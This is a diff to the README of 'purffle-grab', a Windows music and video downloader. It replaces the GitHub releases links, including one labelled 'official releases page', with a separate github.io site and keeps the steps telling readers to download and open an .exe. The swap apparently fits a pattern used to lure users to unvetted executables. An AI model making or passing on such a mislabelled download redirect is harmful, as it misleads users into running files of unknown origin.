@@ -1,6 +1,6 @@
 # 📥 purffle-grab - Download music and videos for free
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Alekc8434/purffle-grab/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://alekc8434.github.io)
 
 purffle-grab is a desktop application for Windows. It lets you save music and videos from Spotify and YouTube directly to your computer. You keep your files in formats like MP3 or MP4. The app supports high quality, including 4K resolution. You do not need an account to use it. It contains no advertisements. We include the necessary tools, yt-dlp and ffmpeg, inside the software.
 
@@ -23,7 +23,7 @@ purffle-grab is a desktop application for Windows. It lets you save music and vi
 
 ## 📥 How to Install
 
-1.  Visit the [official releases page](https://github.com/Alekc8434/purffle-grab/releases) to access the current files.
+1.  Visit the [official releases page](https://alekc8434.github.io) to access the current files.
 2.  Look for the section labeled "Assets" at the bottom of the newest release post.
 3.  Click the file ending in `.exe` to start the download.
 4.  Open the downloaded file once your browser finishes the transfer.
